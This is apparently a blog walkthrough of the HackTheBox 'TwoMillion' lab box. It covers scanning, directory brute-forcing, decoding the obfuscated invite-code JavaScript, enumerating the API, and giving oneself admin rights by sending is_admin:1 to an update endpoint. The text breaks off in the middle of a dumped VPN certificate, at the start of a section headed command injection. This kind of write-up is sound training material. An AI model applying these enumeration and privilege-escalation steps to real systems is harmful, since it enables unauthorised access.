
To celebrate 2,000,000 HackTheBox members, HackTheBox introduced TwoMillion, a special release. This release is exclusively available to retired members, offering a unique experience devoid of points and bloods. TwoMillion mimics the appearance of the original HackTheBox platform, complete with the familiar invite code challenge that requires solving for registration. Once successfully registered, my journey begins by enumerating the API to locate an endpoint that grants administrator privileges. Exploiting a command injection vulnerability within another admin endpoint, I gain access. Utilizing the obtained database credentials, I pivot to the next user, and with the aid of a kernel exploit, I escalate privileges to root. Beyond Root, I encounter an intriguing Easter egg challenge that contains a heartfelt thank you message. Additionally, there's a YouTube video that delves into the webserver and explores its vulnerabilities.

## Scanning

```ruby
^^/H/TwoMillion >>> rs 10.10.11.221                                                                                                                     (130) 09:15:31 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.221:22
Open 10.10.11.221:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-16 09:19 EDT
Initiating Ping Scan at 09:19
Scanning 10.10.11.221 [2 ports]
Completed Ping Scan at 09:19, 0.24s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:19
Completed Parallel DNS resolution of 1 host. at 09:19, 0.04s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 09:19
Scanning 10.10.11.221 [2 ports]
Discovered open port 80/tcp on 10.10.11.221
Discovered open port 22/tcp on 10.10.11.221
Completed Connect Scan at 09:19, 0.33s elapsed (2 total ports)
Nmap scan report for 10.10.11.221
Host is up, received syn-ack (0.26s latency).
Scanned at 2023-06-16 09:19:08 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
```

### NMAP
```ruby
^^/H/TwoMillion >>> sudo nmap -p 22,80 -sCV 10.10.11.221                                                                                                      09:19:10 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-16 09:19 EDT
Nmap scan report for 10.10.11.221
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.30 seconds
```

The webserver is redirecting to `http://2million.htb`
We should add ip and domain in `/etc/hosts` 
```/etc/hosts
10.10.10.11 2million.htb
```

### Directory Bruteforce

```ruby
^^/H/TwoMillion >>> dirsearch -u http://2million.htb/ -x 403,404                                                                                              09:39:50 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/2million.htb/-_23-06-16_09-49-33.txt

Error Log: /home/kali/.dirsearch/logs/errors-23-06-16_09-49-33.log

Target: http://2million.htb/

[09:49:39] Starting: 
[09:49:42] 301 -  162B  - /js  ->  http://2million.htb/js/
[09:50:05] 200 -    2KB - /404
[09:50:54] 401 -    0B  - /api
[09:50:54] 401 -    0B  - /api/v1
[09:50:57] 301 -  162B  - /assets  ->  http://2million.htb/assets/
[09:51:15] 301 -  162B  - /css  ->  http://2million.htb/css/
[09:51:31] 301 -  162B  - /fonts  ->  http://2million.htb/fonts/
[09:51:36] 302 -    0B  - /home  ->  /
[09:51:39] 301 -  162B  - /images  ->  http://2million.htb/images/
[09:51:51] 200 -    4KB - /login
[09:51:54] 302 -    0B  - /logout  ->  /
[09:52:32] 200 -    4KB - /register
[09:53:17] 301 -  162B  - /views  ->  http://2million.htb/views/

Task Completed
```

### Website - TCP 80
#### Site

At the Footer of the page we can see that web page is from `2017`.
Any option you click it will take you to `/login` gives a login form

![Web-page-80](https://github.com/Wln5t0n/blogs/assets/85233203/3e53c557-3013-4aa7-b0e3-82af3bd957ab)


Till now we don't have any creds i tried to test forgot passwd but it leads to nothing then i saw "join" which leads to  `/invite`.

### Register account


![invite](https://github.com/Wln5t0n/blogs/assets/85233203/67bf4312-7580-4327-b551-09a88f665b99)


When you see the source code of the web page will save the invitation code in local storage, and when the invitation code is randomly input, it will prompt that the verification code is invalid.
```ruby
// Store the invite code in localStorage
localStorage.setItem('inviteCode', code);
```

There is obfuscated code in the js file inviteapi.min.js, replace eval with alert to view the original content.
The js code defines the verifyInviteCode function and the makeInviteCode function.
```js
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}
```

Now lets try to call the makeInviteCode function directly in the browser console.
![makeInviteCode](https://github.com/Wln5t0n/blogs/assets/85233203/b68f82a2-7f49-4c9a-bc5c-a32aa750b296)


#### Response
```ruby
Object { 0: 200, success: 1, data: {…}, hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..." }
​
0: 200
​
data: Object { data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr", enctype: "ROT13" }
​
hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
​
success: 1
```

When you decode this with ROT13:
```
`In order to generate the invite code, make a POST request to /api/v1/invite/generate`
```

You can use cyberchef to decode this message:
https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=VmEgYmVxcmUgZ2IgdHJhcmVuZ3IgZ3VyIHZhaXZnciBwYnFyLCB6bnhyIG4gQ0JGRyBlcmRocmZnIGdiIC9uY3YvaTEvdmFpdmdyL3RyYXJlbmdy

Now lets send a `POST` request to get invite code.
```ruby
^^/H/TwoMillion >>> curl -X POST http://2million.htb/api/v1/invite/generate                                                                                   09:58:16 
{"0":200,"success":1,"data":{"code":"MkVYNEotSlpQVzYtSjBDNjEtNDRUQUM=","format":"encoded"}}⏎
```

Seems like base64.
```ruby
^^/H/TwoMillion >>> echo "MkVYNEotSlpQVzYtSjBDNjEtNDRUQUM=" | base64 -d                                                                                       10:20:29 
2EX4J-JZPW6-J0C61-44TAC⏎
```

Lets use this code to register.
![decoded_invite_code](https://github.com/Wln5t0n/blogs/assets/85233203/a0537fab-98d0-47aa-a32c-3e877cc1beae)


So now we are in now we can access `/home`.
![home-page](https://github.com/Wln5t0n/blogs/assets/85233203/8ac2b848-6a27-44c0-83d1-367937fbff69)


I didn't got any thing strange in webpage then i saw `http://2million.htb/js/htb-backend.min.js`. we have direct access to `/api`, which will give the path information.
```js
function pingMachine(t, e) {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: "/api/machines/ping/" + t + "?api_token=" + e,
        beforeSend: function() {
            $("#status" + t).attr("class", "fa fa-circle-o-notch fa-spin")
        },
        complete: function() {},
        success: function(e) {
            1 == e.success ? successFlash("#status" + t, "fa fa-check text-accent") : $("#status" + t).attr("class", "fa fa-times text-danger")
        },
        error: function(t) {
            console.log(t)
        }
    })
}
```

I tried to access `/api`
```ruby
GET /api HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=jli1t3sd64rig7par67u26nfv0
Upgrade-Insecure-Requests: 1
```

#### Response
```ruby
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 16 Jun 2023 15:36:37 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 36
{"\/api\/v1":"Version 1 of the API"}
```

It Prompt `/api/v1` when accessing `/api`, among which the interfaces related to administrators are of interest.

#### Request
```ruby
GET /api/v1 HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=jli1t3sd64rig7par67u26nfv0
Upgrade-Insecure-Requests: 1
```

#### Response
```ruby
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 16 Jun 2023 15:41:27 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 800

{"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":"Verify invite code","\/api\/v1\/user\/auth":"Check if user is authenticated","\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration","\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration","\/api\/v1\/user\/vpn\/download":"Download OVPN file"},"POST":{"\/api\/v1\/user\/register":"Register a new user","\/api\/v1\/user\/login":"Login with existing user"}},"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}}}
```

If we try to access `/api/v1/admin/auth` which return's `false` value.
#### Request
```ruby
GET /api/v1/admin/auth HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=jli1t3sd64rig7par67u26nfv0
Upgrade-Insecure-Requests: 1
```

#### Response
```ruby
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 16 Jun 2023 15:43:11 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 17


{"message":false}
```

Lets try to generate admin's vpn `/api/v1/admin/vpn/generate`. A 401 status code is returned when trying to generate a VPN
#### Request
```ruby
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=jli1t3sd64rig7par67u26nfv0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

#### Response
```ruby
HTTP/1.1 401 Unauthorized
Server: nginx
Date: Fri, 16 Jun 2023 15:49:57 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 0
```

When updating data to `/api/v1/admin/settings/update`, it prompts that the data type is incorrect. After changing to `json`, it prompts that the content is missing.

#### Request
```ruby
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=jli1t3sd64rig7par67u26nfv0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

#### Response
```ruby
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 16 Jun 2023 15:53:08 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 53
{"status":"danger","message":"Invalid content type."}
```


I change the `Content-Type` to `json` and we get a message `Missing parameter: email`.
```ruby
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=jli1t3sd64rig7par67u26nfv0
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 2
```

#### Response
```ruby
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 16 Jun 2023 16:03:10 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 56

{"status":"danger","message":"Missing parameter: email"}
```

Now i pass my email and i got `Missing parameter: is_admin`.

#### Request
```ruby
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=jli1t3sd64rig7par67u26nfv0
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 33

{
"email":"wln5t0n@htb.com"
}
```

#### Response
```ruby
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 16 Jun 2023 16:05:39 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 59

{"status":"danger","message":"Missing parameter: is_admin"}
```

Now i passed `is_admin` and i got `Variable is_admin needs to be either 0 or 1.`

#### Request
```ruby
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101
Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=jli1t3sd64rig7par67u26nfv0
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 53

{
"email":"wln5t0n@htb.com",
"is_admin" : true
}
```

#### Response
```ruby
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 16 Jun 2023 16:10:53 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 76

{"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}
```

I changed the `is_admin` to `1` and yes it worked.
#### Request
```ruby
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=jli1t3sd64rig7par67u26nfv0
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 50

{
"email":"wln5t0n@htb.com",
"is_admin" : 1
}
```

#### Response
```ruby
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 16 Jun 2023 16:12:30 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 43

{"id":13,"username":"wln5t0n","is_admin":1}
```

Nice i am admin now i can access `/api/v1/admin/auth` lets check now.
#### Request
```ruby
GET /api/v1/admin/auth HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=jli1t3sd64rig7par67u26nfv0
Upgrade-Insecure-Requests: 1
```

#### Response
```ruby
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 16 Jun 2023 16:15:22 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 16

{"message":true}
```

### Command Injection

Now i can access `/api/v1/admin/vpn/generate`. 
#### Request
```ruby
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=jli1t3sd64rig7par67u26nfv0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

#### Response
```ruby
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 16 Jun 2023 16:17:40 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 53

{"status":"danger","message":"Invalid content type."}
```

Now I’ll send my username, and it generates a VPN key.
#### Request
```ruby
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=jli1t3sd64rig7par67u26nfv0
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 31

{
	"username":"wln5t0n"
}
```

#### Response
```ruby
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 16 Jun 2023 16:19:57 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 10832



client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
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
2iX/ag==
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1 (0x1)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=UK, ST=London, L=London, O=HackTheBox, OU=VPN, CN=2million/emailAddress=info@hackthebox.eu
        Validity
            Not Before: Jun 16 16:19:57 2023 GMT
            Not After : Jun 15 16:19:57 2024 GMT
        Subject: C=GB, ST=London, L=London, O=wln5t0n, CN=wln5t0n
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:95:38:61:92:d5:3d:df:7a:c4:15:ec:b6:b5:61:
                    df:8a:fe:c6:b5:4e:3f:41:1e:7c:3b:4a:4f:74:07:
                    1a:2f:75:61:05:83:13:f5:94:56:ac:ae:bf:5f:44:
                    bb:e7:73:89:29:b3:f2:b4:51:f5:da:37:cb:5d:1b:
                    de:f5:ae:db:ee:34:3d:12:2d:95:57:0b:33:a8:f7:
                    72:09:ba:78:c4:a2:b2:14:9e:cf:8e:80:f2:68:cf:
                    f4:48:39:96:f8:8d:9e:f3:64:64:77:26:d9:f6:80:
                    a7:91:db:d4:38:2a:53:33:8e:83:0d:71:8a:a4:cb:
                    61:28:b5:a4:83:db:70:ad:67:e0:f0:52:1d:4f:b6:
                    d1:a4:56:e3:a2:99:56:6d:ad:59:ad:ca:f1:cb:d0:
                    d9:62:f4:6a:1f:46:96:52:77:ef:49:84:54:70:5c:
                    6c:1c:28:ba:a1:74:a2:25:f0:da:3f:c4:e7:9a:c5:
                    61:1b:c2:a1:0c:5c:39:58:17:16:39:15:9a:d0:d7:
                    f3:c7:46:fa:01:d6:ac:c0:21:72:66:9c:bd:91:99:
                    89:c4:cf:36:a0:d3:cd:a0:be:6b:f5:c2:4a:5f:38:
                    eb:de:6c:a1:a6:50:89:ca:6b:1e:29:67:9a:1e:9f:
                    f9:07:63:c7:de:69:f9:d3:01:9c:b0:15:4f:41:ca:
                    69:27
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                3C:41:EA:B0:9D:01:72:50:FF:EA:F1:AF:4D:28:9A:1D:EA:5D:DC:9E
            X509v3 Authority Key Identifier: 
                7A:62:DD:1D:B6:FE:4A:C8:E3:F8:9F:FA:AC:F4:15:0C:96:BA:2E:91
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Key Usage: 
                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment, Key Agreement, Certificate Sign, CRL Sign
            Netscape Comment: 
                OpenSSL Generated Certificate
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        01:17:c0:d1:46:b8:33:97:20:8b:05:90:ed:9d:dc:1c:7c:f6:
        8a:39:a8:a7:b1:db:ae:93:68:08:85:88:ef:f7:df:fa:d8:0e:
        b3:a0:bc:e0:fb:47:72:1e:ce:36:12:bc:46:83:1a:be:2b:3e:
        a5:54:30:f0:81:7c:88:58:f1:a1:bb:d9:4c:fb:ef:0b:79:06:
        06:96:21:65:f3:8e:bd:31:3d:9e:be:b2:a0:a2:74:05:b0:d9:
        1c:e9:bc:e6:8e:43:44:00:b4:b7:99:7a:57:ad:d9:1e:cd:66:
        e0:64:6b:f4:a1:f9:d4:f5:47:20:7f:4c:34:8e:84:67:29:b7:
        75:4f:49:d0:ab:eb:c7:c2:4a:18:b7:c1:04:00:44:2d:e2:0d:
        37:76:7e:e4:65:3d:59:de:90:32:01:d2:46:b0:5c:24:0e:4f:
        ae:ec:0c:a4:1f:ec:03:96:fe:f8:49:2e:a8:0a:9f:e8:4d:7a:
        a6:75:8c:63:a3:f3:9f:95:3c:37:2c:69:c9:a8:8a:12:7a:b0:
        bc:15:36:9a:63:6f:de:a5:f7:85:e6:4f:0b:4c:dc:1c:1a:8c:
        d1:05:9e:04:f4:d6:fa:b6:1f:b1:d5:6d:40:42:60:dc:20:cf:
        92:ac:03:1a:39:e1:b1:5f:cc:2e:45:70:a8:42:2e:af:ea:7f:
        3d:90:94:16:a8:5a:7e:8c:89:a0:7e:86:4f:9b:22:e1:b9:37:
        1e:4b:af:79:a0:d0:45:3e:88:12:ec:1e:18:62:d8:f3:d4:08:
        b8:ef:9e:e2:71:f5:d4:3c:37:8b:d3:4a:d2:6a:25:00:5a:23:
        21:68:31:bd:c5:81:90:08:4a:60:bb:10:3f:b3:79:7e:b5:eb:
        f7:64:35:9c:d9:74:b2:9c:de:e5:0f:32:36:a0:a8:74:61:a4:
        8f:2b:1f:fd:50:5d:53:84:bf:97:a3:7b:de:c0:87:62:d5:41:
        a6:34:31:fd:67:dc:39:23:03:bb:46:de:f0:e4:3d:82:98:0b:
        80:7b:ab:80:c9:a7:bd:fd:91:04:17:a7:ec:9c:84:0a:f6:b3:
        b1:5a:a0:86:9a:c0:db:85:ee:f1:70:ec:d6:08:5e:03:b2:09:
        12:5c:c3:c7:04:6c:64:3b:ab:1a:ec:f9:3f:54:65:a7:46:ee:
        ac:22:db:da:43:34:c7:73:10:0d:c6:29:47:89:ad:10:e3:f0:
